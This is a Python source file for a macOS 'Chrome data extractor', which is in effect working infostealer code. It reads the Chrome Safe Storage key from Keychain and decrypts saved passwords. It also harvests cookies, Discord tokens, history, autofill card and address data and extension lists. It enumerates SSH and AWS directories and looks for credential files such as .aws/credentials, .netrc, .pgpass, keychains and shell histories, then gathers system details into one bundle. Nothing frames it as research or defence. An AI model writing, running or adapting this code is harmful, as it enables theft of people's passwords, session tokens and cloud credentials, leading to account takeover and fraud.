"""
macOS File System and Chrome Data Extractor
Handles Chrome passwords, tokens, cookies, and file system access
"""

import os
import json
import sqlite3
import subprocess
import shutil
import time
import glob
from pathlib import Path
from typing import Dict, List, Any, Optional
import keyring
from Crypto.Cipher import AES
import base64
import psutil


class ChromeDataExtractor:
    """Extracts Chrome passwords, cookies, and session data from macOS"""
    
    def __init__(self):
        self.chrome_paths = [
            Path.home() / "Library/Application Support/Google/Chrome",
            Path.home() / "Library/Application Support/Google/Chrome Beta",
            Path.home() / "Library/Application Support/Google/Chrome Dev",
        ]
        self.keychain_service = "Chrome Safe Storage"
    
    def get_chrome_profiles(self) -> List[Path]:
        """Get all Chrome profile directories"""
        profiles = []
        for chrome_path in self.chrome_paths:
            if chrome_path.exists():
                profiles.extend(chrome_path.glob("Profile *"))
                profiles.extend(chrome_path.glob("Default"))
        return profiles
    
    def get_master_key(self) -> Optional[bytes]:
        """Extract Chrome master key from macOS Keychain"""
        try:
            # Try to get the Chrome Safe Storage password from keychain
            password = subprocess.check_output([
                "security", "find-generic-password", 
                "-w", "-s", self.keychain_service
            ], stderr=subprocess.DEVNULL).decode().strip()
            
            if password:
                # Chrome uses PBKDF2 with the password
                import hashlib
                key = hashlib.pbkdf2_hmac('sha1', password.encode(), b'saltysalt', 1003)
                return key[:16]  # Chrome uses 16-byte keys
        except subprocess.CalledProcessError:
            pass
        return None
    
    def decrypt_password(self, encrypted_password: bytes, master_key: bytes) -> str:
        """Decrypt Chrome password using AES"""
        try:
            # Remove the 'v10' or 'v11' prefix
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                encrypted_password = encrypted_password[3:]
            
            # Chrome uses AES in CBC mode
            iv = encrypted_password[:16]
            ciphertext = encrypted_password[16:]
            
            cipher = AES.new(master_key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            # Remove padding
            return decrypted.rstrip(b'\x00').decode('utf-8', errors='ignore')
        except Exception:
            return ""
    
    def extract_passwords(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract saved passwords from Chrome profile"""
        passwords = []
        login_db = profile_path / "Login Data"
        
        if not login_db.exists():
            return passwords
        
        try:
            # Copy database to temp location since Chrome might have it locked
            temp_db = Path("/tmp/chrome_login_temp.db")
            shutil.copy2(login_db, temp_db)
            
            master_key = self.get_master_key()
            if not master_key:
                return passwords
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins
            """)
            
            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created = row
                if encrypted_password:
                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
                    passwords.append({
                        "url": origin_url,
                        "username": username,
                        "password": decrypted_password,
                        "date_created": date_created
                    })
            
            conn.close()
            temp_db.unlink()  # Clean up temp file
            
        except Exception as e:
            print(f"Error extracting passwords: {e}")
        
        return passwords
    
    def extract_cookies(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract cookies from Chrome profile"""
        cookies = []
        cookies_db = profile_path / "Cookies"
        
        if not cookies_db.exists():
            return cookies
        
        try:
            temp_db = Path("/tmp/chrome_cookies_temp.db")
            shutil.copy2(cookies_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
                FROM cookies
            """)
            
            for row in cursor.fetchall():
                host_key, name, value, path, expires_utc, is_secure, is_httponly = row
                cookies.append({
                    "host": host_key,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expires_utc,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly)
                })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            print(f"Error extracting cookies: {e}")
        
        return cookies

    def extract_discord_tokens(self, profile_path: Path) -> List[str]:
        """Extract Discord tokens from Chrome Local Storage"""
        tokens = []
        local_storage_path = profile_path / "Local Storage" / "leveldb"
        
        # Try alternative path structure for newer Chrome versions
        if not local_storage_path.exists():
            local_storage_path = profile_path / "Local Storage" / "chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm" / "0.localstorage"
        
        # Check for Local Storage in IndexedDB format (more common in newer Chrome versions)
        indexeddb_path = profile_path / "IndexedDB"
        
        # First, try the legacy WebSQL/LocalStorage format if it exists
        legacy_local_storage = profile_path / "Local Storage" / "https_app.discord.com_0.localstorage"
        if legacy_local_storage.exists():
            try:
                with open(legacy_local_storage, 'rb') as f:
                    content = f.read()
                    # Look for Discord tokens in the file content
                    tokens.extend(self._find_discord_tokens_in_content(content))
            except Exception:
                pass  # File might be locked or inaccessible
        
        # Look in indexedDB for newer versions
        if indexeddb_path.exists():
            try:
                for ldb_file in indexeddb_path.rglob("*.ldb"):
                    try:
                        with open(ldb_file, 'rb') as f:
                            content = f.read()
                            tokens.extend(self._find_discord_tokens_in_content(content))
                    except:
                        continue  # File might be locked
            except:
                pass

        # Also check in Extension Local Storage (for Discord Desktop and web versions)
        extension_storage = profile_path / "Local Extension Settings" / "cjpalhdlnbpafiamejdnhcphjbkeiagm"
        if extension_storage.exists():
            try:
                for file in extension_storage.iterdir():
                    if file.is_file():
                        try:
                            with open(file, 'rb') as f:
                                content = f.read()
                                tokens.extend(self._find_discord_tokens_in_content(content))
                        except:
                            continue
            except:
                pass

        # Also try to find tokens in regular cookies
        cookies = self.extract_cookies(profile_path)
        for cookie in cookies:
            if "discord" in cookie["host"] and cookie["name"] in ["token", "authorization", "__Secure-"]:
                if self._is_valid_discord_token(cookie["value"]):
                    tokens.append(cookie["value"])

        return list(set(tokens))  # Remove duplicates

    def extract_local_storage(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract all localStorage data from Chrome"""
        local_storage_data = []
        
        # Check for Local Storage files in newer format
        local_storage_path = profile_path / "Local Storage" / "leveldb"
        
        if local_storage_path.exists():
            try:
                for ldb_file in local_storage_path.rglob("*.ldb"):
                    try:
                        with open(ldb_file, 'rb') as f:
                            content = f.read()
                            # Try to extract key-value pairs from the ldb file
                            # This is a simplified extraction - in practice, LevelDB files need specific parsing
                            possible_keys = self._extract_strings_from_bytes(content)
                            local_storage_data.extend([{"key": key, "value": "binary_data", "source_file": str(ldb_file)} for key in possible_keys if len(key) > 3])
                    except:
                        continue
            except:
                pass

        # Also check in IndexedDB which may store localStorage data
        indexeddb_path = profile_path / "IndexedDB"
        if indexeddb_path.exists():
            try:
                for ldb_file in indexeddb_path.rglob("*.ldb"):
                    try:
                        with open(ldb_file, 'rb') as f:
                            content = f.read()
                            possible_keys = self._extract_strings_from_bytes(content)
                            local_storage_data.extend([{"key": key, "value": "indexeddb_data", "source_file": str(ldb_file)} for key in possible_keys if len(key) > 5 and ("localStorage" in key or "sessionStorage" in key)])
                    except:
                        continue
            except:
                pass
        
        return local_storage_data

    def extract_chrome_history(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract browser history from Chrome"""
        history = []
        history_db = profile_path / "History"
        
        if not history_db.exists():
            return history
        
        try:
            temp_db = Path("/tmp/chrome_history_temp.db")
            shutil.copy2(history_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, visit_count, typed_count, last_visit_time, hidden
                FROM urls
                ORDER BY last_visit_time DESC
                LIMIT 1000  -- Limit to prevent too much data
            """)
            
            for row in cursor.fetchall():
                url, title, visit_count, typed_count, last_visit_time, hidden = row
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "typed_count": typed_count,
                    "last_visit_time": last_visit_time,
                    "hidden": bool(hidden)
                })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            print(f"Error extracting history: {e}")
        
        return history

    def extract_chrome_bookmarks(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract bookmarks from Chrome (already partially implemented, but expanded here)"""
        bookmarks = []
        bookmarks_file = profile_path / "Bookmarks"
        
        if bookmarks_file.exists():
            try:
                with open(bookmarks_file, 'r', encoding='utf-8') as f:
                    bookmarks_data = json.load(f)
                    bookmarks = self._extract_bookmarks(bookmarks_data)
            except Exception as e:
                print(f"Error reading bookmarks: {e}")
        
        return bookmarks

    def extract_autofill_data(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract autofill data from Chrome"""
        autofill_data = []
        web_data_db = profile_path / "Web Data"
        
        if not web_data_db.exists():
            return autofill_data
        
        try:
            temp_db = Path("/tmp/chrome_webdata_temp.db")
            shutil.copy2(web_data_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Extract credit cards
            try:
                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for row in cursor.fetchall():
                    guid, name, exp_month, exp_year, encrypted_number = row
                    autofill_data.append({
                        "type": "credit_card",
                        "guid": guid,
                        "name_on_card": name,
                        "expiration_month": exp_month,
                        "expiration_year": exp_year,
                        # Note: card number is encrypted and would require additional decryption
                        "card_number_encrypted": encrypted_number.hex() if encrypted_number else None
                    })
            except:
                pass  # Table might not exist in all versions
            
            # Extract addresses
            try:
                cursor.execute("SELECT guid, company_name, street_address, address_line_2, city, state, zipcode, country_code FROM autofill_profiles")
                for row in cursor.fetchall():
                    guid, company, street, line2, city, state, zipcode, country = row
                    autofill_data.append({
                        "type": "address",
                        "guid": guid,
                        "company_name": company,
                        "street_address": street,
                        "address_line_2": line2,
                        "city": city,
                        "state": state,
                        "zipcode": zipcode,
                        "country_code": country
                    })
            except:
                pass  # Table might not exist in all versions
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            print(f"Error extracting autofill data: {e}")
        
        return autofill_data

    def extract_extensions(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract installed Chrome extensions"""
        extensions = []
        
        extensions_dir = profile_path / "Extensions"
        if extensions_dir.exists():
            for ext_dir in extensions_dir.iterdir():
                if ext_dir.is_dir():
                    # Look for manifest.json in each version directory
                    for version_dir in ext_dir.iterdir():
                        if version_dir.is_dir():
                            manifest_path = version_dir / "manifest.json"
                            if manifest_path.exists():
                                try:
                                    with open(manifest_path, 'r', encoding='utf-8') as f:
                                        manifest = json.load(f)
                                        extensions.append({
                                            "id": ext_dir.name,
                                            "version": version_dir.name,
                                            "name": manifest.get("name", ""),
                                            "description": manifest.get("description", ""),
                                            "permissions": manifest.get("permissions", []),
                                            "path": str(version_dir)
                                        })
                                except:
                                    continue
        
        return extensions

    def _extract_strings_from_bytes(self, content: bytes) -> List[str]:
        """Helper method to extract potential text strings from binary data"""
        import re
        
        # Look for sequences of printable ASCII characters
        strings = []
        
        # Pattern for strings of at least 4 printable characters
        pattern = rb'[ -~]{4,}'  # Printable ASCII characters, minimum 4
        matches = re.findall(pattern, content)
        
        for match in matches:
            try:
                decoded = match.decode('utf-8', errors='ignore')
                if decoded.strip() and len(decoded) > 3:
                    strings.append(decoded.strip())
            except:
                continue
        
        return strings

    def _find_discord_tokens_in_content(self, content: bytes) -> List[str]:
        """Find Discord tokens in binary content"""
        import re
        
        tokens = []
        # Discord token regex pattern - User ID (numbers) + '.' + 6 character string + '.' + random characters
        token_pattern = rb'[a-zA-Z0-9-_]{24}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{27,}'
        
        matches = re.findall(token_pattern, content)
        for match in matches:
            token_str = match.decode('utf-8', errors='ignore')
            if self._is_valid_discord_token(token_str):
                tokens.append(token_str)
        
        return tokens

    def _is_valid_discord_token(self, token: str) -> bool:
        """Validate if a string is a potentially valid Discord token"""
        import base64
        import json
        
        # Basic pattern check
        if not token or len(token) < 50:  # Discord tokens are typically ~59 characters
            return False
        
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        # Decode the first part (user ID) to see if it's numeric when decoded
        try:
            # Add padding if needed for base64 decoding
            first_part = parts[0]
            padding = 4 - (len(first_part) % 4)
            if padding != 4:
                first_part += '=' * padding
            
            decoded = base64.b64decode(first_part)
            # The first part is usually a user ID which should decode to readable text/numbers
            user_id = decoded.decode('utf-8', errors='ignore')
            # Check if it looks like a user ID (contains numbers)
            if any(char.isdigit() for char in user_id):
                return True
        except:
            pass
        
        return False
    
    def extract_session_data(self, profile_path: Path) -> Dict[str, Any]:
        """Extract session and profile data"""
        session_data = {
            "profile_name": profile_path.name,
            "profile_path": str(profile_path),
            "preferences": {},
            "bookmarks": [],
            "history": [],
            "discord_tokens": [],
            "local_storage": [],
            "autofill_data": [],
            "extensions": []
        }
        
        # Extract Discord tokens
        session_data["discord_tokens"] = self.extract_discord_tokens(profile_path)
        
        # Extract localStorage data
        session_data["local_storage"] = self.extract_local_storage(profile_path)
        
        # Extract autofill data
        session_data["autofill_data"] = self.extract_autofill_data(profile_path)
        
        # Extract installed extensions
        session_data["extensions"] = self.extract_extensions(profile_path)
        
        # Extract preferences
        prefs_file = profile_path / "Preferences"
        if prefs_file.exists():
            try:
                with open(prefs_file, 'r') as f:
                    prefs = json.load(f)
                    session_data["preferences"] = {
                        "profile_name": prefs.get("profile", {}).get("name", ""),
                        "avatar_icon": prefs.get("profile", {}).get("avatar_icon", ""),
                        "extensions": list(prefs.get("extensions", {}).keys())
                    }
            except Exception as e:
                print(f"Error reading preferences: {e}")
        
        # Extract bookmarks
        bookmarks_file = profile_path / "Bookmarks"
        if bookmarks_file.exists():
            try:
                with open(bookmarks_file, 'r') as f:
                    bookmarks = json.load(f)
                    session_data["bookmarks"] = self._extract_bookmarks(bookmarks)
            except Exception as e:
                print(f"Error reading bookmarks: {e}")
        
        return session_data
    
    def _extract_bookmarks(self, bookmarks_data: Dict) -> List[Dict]:
        """Recursively extract bookmarks"""
        bookmarks = []
        
        def extract_from_node(node):
            if node.get("type") == "url":
                bookmarks.append({
                    "name": node.get("name", ""),
                    "url": node.get("url", ""),
                    "date_added": node.get("date_added", "")
                })
            elif node.get("type") == "folder":
                for child in node.get("children", []):
                    extract_from_node(child)
        
        for root in bookmarks_data.get("roots", {}).values():
            if isinstance(root, dict) and "children" in root:
                for child in root["children"]:
                    extract_from_node(child)
        
        return bookmarks


class FileSystemExtractor:
    """Extracts accessible files from macOS file system"""
    
    def __init__(self):
        self.home_dir = Path.home()
        self.accessible_paths = [
            self.home_dir / "Desktop",
            self.home_dir / "Documents", 
            self.home_dir / "Downloads",
            self.home_dir / "Pictures",
            self.home_dir / "Movies",
            self.home_dir / "Music",
            self.home_dir / "Public",
            self.home_dir / "Library",
            self.home_dir / "Library/Application Support",
            self.home_dir / "Library/Preferences",
            self.home_dir / ".ssh",
            self.home_dir / ".aws",
            self.home_dir / ".config",
            Path("/Applications"),
            Path("/System/Applications"),
            Path("/Users/Shared"),
            Path("/private/etc"),
            Path("/usr/local/bin"),
            Path("/usr/local/lib"),
        ]
    
    def get_accessible_files(self, max_files: int = 1000) -> List[Dict[str, Any]]:
        """Get list of accessible files with metadata"""
        files = []
        
        for path in self.accessible_paths:
            if path.exists():
                try:
                    for file_path in path.rglob("*"):
                        if len(files) >= max_files:
                            break
                        
                        if file_path.is_file() and not self._is_system_file(file_path):
                            try:
                                stat = file_path.stat()
                                files.append({
                                    "path": str(file_path),
                                    "name": file_path.name,
                                    "size": stat.st_size,
                                    "modified": stat.st_mtime,
                                    "permissions": oct(stat.st_mode)[-3:],
                                    "extension": file_path.suffix
                                })
                            except (PermissionError, OSError):
                                continue
                except (PermissionError, OSError):
                    continue
        
        return files[:max_files]
    
    def _is_system_file(self, file_path: Path) -> bool:
        """Check if file should be excluded"""
        excluded_patterns = [
            ".DS_Store", ".localized", ".Trash", ".Spotlight-V100",
            ".fseventsd", ".TemporaryItems", ".VolumeIcon.icns"
        ]
        
        return any(pattern in str(file_path) for pattern in excluded_patterns)
    
    def get_sensitive_files(self) -> List[Dict[str, Any]]:
        """Get specific sensitive files that might contain important data"""
        sensitive_files = []
        sensitive_paths = [
            self.home_dir / ".bash_history",
            self.home_dir / ".zsh_history", 
            self.home_dir / ".ssh/known_hosts",
            self.home_dir / ".ssh/config",
            self.home_dir / ".aws/credentials",
            self.home_dir / ".aws/config",
            self.home_dir / ".gitconfig",
            self.home_dir / ".netrc",
            self.home_dir / ".pgpass",
            self.home_dir / "Library/Keychains/*",  # Keychain files
            self.home_dir / "Library/Mobile Documents/*",  # iCloud files
        ]
        
        # Expand glob patterns and check each path
        for path_pattern in sensitive_paths:
            if "*" in str(path_pattern):
                # Handle glob patterns - expand in the proper directory
                if "Library/Keychains" in str(path_pattern):
                    expanded_paths = list((self.home_dir / "Library/Keychains").glob("*"))
                elif "Library/Mobile Documents" in str(path_pattern):
                    expanded_paths = list((self.home_dir / "Library/Mobile Documents").glob("*"))
                else:
                    # For other patterns, try direct glob
                    expanded_paths = list(Path(str(path_pattern)).parent.glob(Path(str(path_pattern)).name))
                
                for expanded_path in expanded_paths:
                    self._add_file_if_exists(expanded_path, sensitive_files)
            else:
                self._add_file_if_exists(path_pattern, sensitive_files)
        
        # Also check for common environment and configuration files
        config_paths = [
            self.home_dir / ".env",
            self.home_dir / ".bashrc",
            self.home_dir / ".zshrc",
            self.home_dir / ".profile",
            self.home_dir / ".vimrc",
            self.home_dir / ".screenrc",
            self.home_dir / ".tmux.conf",
            Path("/etc/hosts"),
            Path("/etc/passwd")  # This will likely require elevated permissions
        ]
        
        for config_path in config_paths:
            self._add_file_if_exists(config_path, sensitive_files)
        
        return sensitive_files
    
    def _add_file_if_exists(self, file_path: Path, file_list: List[Dict[str, Any]]) -> None:
        """Helper method to add a file to the list if it exists and is accessible"""
        try:
            if file_path.exists() and file_path.is_file():
                stat = file_path.stat()
                file_info = {
                    "path": str(file_path),
                    "name": file_path.name,
                    "size": stat.st_size,
                    "modified": stat.st_mtime,
                    "permissions": oct(stat.st_mode)[-3:],
                    "extension": file_path.suffix,
                    "is_sensitive": True
                }
                file_list.append(file_info)
        except (PermissionError, OSError):
            # Skip files that can't be accessed
            pass

    def get_system_info(self) -> Dict[str, Any]:
        """Get system information"""
        try:
            # Get system info
            system_info = {
                "hostname": os.uname().nodename,
                "username": os.getenv("USER", "unknown"),
                "home_directory": str(self.home_dir),
                "platform": os.uname().sysname,
                "release": os.uname().release,
                "version": os.uname().version,
                "machine": os.uname().machine,
                "node": os.uname().nodename,
                "cpu_count": psutil.cpu_count(),
                "cpu_freq": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {},
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_total": psutil.virtual_memory().total,
                "memory_available": psutil.virtual_memory().available,
                "memory_percent": psutil.virtual_memory().percent,
                "disk_usage": {},
                "network_interfaces": {},
                "running_processes": [],
                "users": [],
                "boot_time": psutil.boot_time()
            }
            
            # Get disk usage
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    system_info["disk_usage"][partition.mountpoint] = {
                        "total": usage.total,
                        "used": usage.used,
                        "free": usage.free,
                        "mountpoint": partition.mountpoint,
                        "device": partition.device,
                        "fstype": partition.fstype
                    }
                except PermissionError:
                    continue
            
            # Get network interface information
            try:
                net_io = psutil.net_io_counters(pernic=True)
                for interface, stats in net_io.items():
                    system_info["network_interfaces"][interface] = {
                        "bytes_sent": stats.bytes_sent,
                        "bytes_recv": stats.bytes_recv,
                        "packets_sent": stats.packets_sent,
                        "packets_recv": stats.packets_recv
                    }
            except:
                pass  # May not have permissions
            
            # Get logged in users
            try:
                for user in psutil.users():
                    system_info["users"].append({
                        "name": user.name,
                        "terminal": user.terminal,
                        "host": user.host,
                        "started": user.started
                    })
            except:
                pass  # May not have permissions
            
            # Get running processes (limited to avoid too much data)
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                try:
                    proc_info = proc.info
                    proc_info['memory_mb'] = proc_info.get('memory_info', {}).rss / 1024 / 1024 if proc_info.get('memory_info') else 0
                    system_info["running_processes"].append(proc_info)
                    if len(system_info["running_processes"]) >= 100:  # Limit
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return system_info
            
        except Exception as e:
            print(f"Error getting system info: {e}")
            return {}


def extract_all_data() -> Dict[str, Any]:
    """Extract all Chrome and file system data"""
    chrome_extractor = ChromeDataExtractor()
    fs_extractor = FileSystemExtractor()
    
    # Get Chrome profiles
    profiles = chrome_extractor.get_chrome_profiles()
    
    chrome_data = {
        "profiles": [],
        "passwords": [],
        "cookies": [],
        "sessions": [],
        "discord_tokens": [],
        "history": [],
        "local_storage": [],
        "autofill_data": [],
        "extensions": []
    }
    
    # Extract data from each profile
    for profile in profiles:
        profile_data = chrome_extractor.extract_session_data(profile)
        passwords = chrome_extractor.extract_passwords(profile)
        cookies = chrome_extractor.extract_cookies(profile)
        history = chrome_extractor.extract_chrome_history(profile)
        # Extract Discord tokens separately to collect from all profiles
        discord_tokens = chrome_extractor.extract_discord_tokens(profile)
        local_storage = chrome_extractor.extract_local_storage(profile)
        autofill_data = chrome_extractor.extract_autofill_data(profile)
        extensions = chrome_extractor.extract_extensions(profile)
        
        chrome_data["profiles"].append(profile_data)
        chrome_data["passwords"].extend(passwords)
        chrome_data["cookies"].extend(cookies)
        chrome_data["sessions"].append(profile_data)
        chrome_data["discord_tokens"].extend(discord_tokens)
        chrome_data["history"].extend(history)
        chrome_data["local_storage"].extend(local_storage)
        chrome_data["autofill_data"].extend(autofill_data)
        chrome_data["extensions"].extend(extensions)
    
    # Remove duplicate tokens
    chrome_data["discord_tokens"] = list(set(chrome_data["discord_tokens"]))
    
    # Get file system data
    files_data = fs_extractor.get_accessible_files()
    sensitive_files = fs_extractor.get_sensitive_files()
    system_info = fs_extractor.get_system_info()
    
    # Combine regular files with sensitive files
    all_files = files_data + sensitive_files
    
    return {
        "chrome_data": chrome_data,
        "files": all_files,  # Includes both regular and sensitive files
        "system_info": system_info,
        "extraction_timestamp": time.time()
    }
